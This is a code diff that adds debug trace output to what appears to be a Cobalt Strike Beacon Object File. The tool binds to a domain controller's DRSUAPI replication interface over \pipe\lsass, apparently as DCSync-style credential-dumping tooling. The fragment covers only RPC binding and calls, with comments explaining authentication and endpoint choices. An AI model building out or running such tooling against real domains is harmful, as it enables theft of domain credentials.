@@ -408,12 +408,20 @@ static RPC_STATUS rpc_call(RPC_BINDING_HANDLE hBind, DWORD opnum,
     msg->ProcNum           = opnum;
     msg->RpcInterfaceInfo  = (void*)&g_drsuapi_if;
 
+    BeaconPrintf(CALLBACK_OUTPUT,
+        "[.] trace: I_RpcGetBuffer (opnum=%u, reqLen=%u)\n", opnum, reqLen);
     RPC_STATUS s = RPCRT4$I_RpcGetBuffer(msg);
+    BeaconPrintf(CALLBACK_OUTPUT,
+        "[.] trace:   s=0x%08x buf=%p\n", s, msg->Buffer);
     if (s) return s;
 
     MSVCRT$memcpy(msg->Buffer, reqNdr, reqLen);
 
+    BeaconPrintf(CALLBACK_OUTPUT,
+        "[.] trace: I_RpcSendReceive (opnum=%u)\n", opnum);
     s = RPCRT4$I_RpcSendReceive(msg);
+    BeaconPrintf(CALLBACK_OUTPUT,
+        "[.] trace:   s=0x%08x replyLen=%u\n", s, msg->BufferLength);
     if (s) { RPCRT4$I_RpcFreeBuffer(msg); return s; }
     return 0;
 }
@@ -1257,16 +1265,23 @@ void go(char *args, int args_len)
      * try ncacn_ip_tcp with endpoint = NULL and EpResolveBinding as
      * a second attempt after this first bind returns UNKNOWN_IF.
      */
+    BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: init_drsuapi_if\n");
     init_drsuapi_if();
 
     RPC_CSTR stringBinding = NULL;
     RPC_BINDING_HANDLE hRpc = NULL;
 
+    BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: RpcStringBindingComposeA\n");
     RPC_STATUS rpcSt = RPCRT4$RpcStringBindingComposeA(
         NULL, (RPC_CSTR)"ncacn_np", (RPC_CSTR)aDC,
         (RPC_CSTR)"\\pipe\\lsass", NULL, &stringBinding);
+    BeaconPrintf(CALLBACK_OUTPUT, "[.] trace:   rpcSt=0x%08x binding=%s\n",
+                 rpcSt, stringBinding ? (char*)stringBinding : "(null)");
     if (rpcSt == 0) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: RpcBindingFromStringBindingA\n");
         rpcSt = RPCRT4$RpcBindingFromStringBindingA(stringBinding, &hRpc);
+        BeaconPrintf(CALLBACK_OUTPUT, "[.] trace:   rpcSt=0x%08x hRpc=%p\n",
+                     rpcSt, hRpc);
         RPCRT4$RpcStringFreeA(&stringBinding);
     }
     if (rpcSt == 0) {
@@ -1274,9 +1289,11 @@ void go(char *args, int args_len)
          * Any lower auth level makes the interface look "unknown" to
          * the caller (Windows hides it rather than returning
          * ACCESS_DENIED on the bind). */
+        BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: RpcBindingSetAuthInfoExA\n");
         rpcSt = RPCRT4$RpcBindingSetAuthInfoExA(hRpc, (RPC_CSTR)aDC,
             RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE,
             NULL, 0, NULL);
+        BeaconPrintf(CALLBACK_OUTPUT, "[.] trace:   rpcSt=0x%08x\n", rpcSt);
     }
     /* No RpcEpResolveBinding: \pipe\lsass is the endpoint.
      * No RpcBindingBind: the first authenticated I_RpcSendReceive
@@ -1293,6 +1310,7 @@ void go(char *args, int args_len)
     BYTE ctxHandle[20];
     MSVCRT$memset(ctxHandle, 0, 20);
 
+    BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: drsr_bind (I_RpcGetBuffer + I_RpcSendReceive)\n");
     if (!drsr_bind(hRpc, ctxHandle)) {
         RPCRT4$RpcBindingFree(&hRpc);
         return;
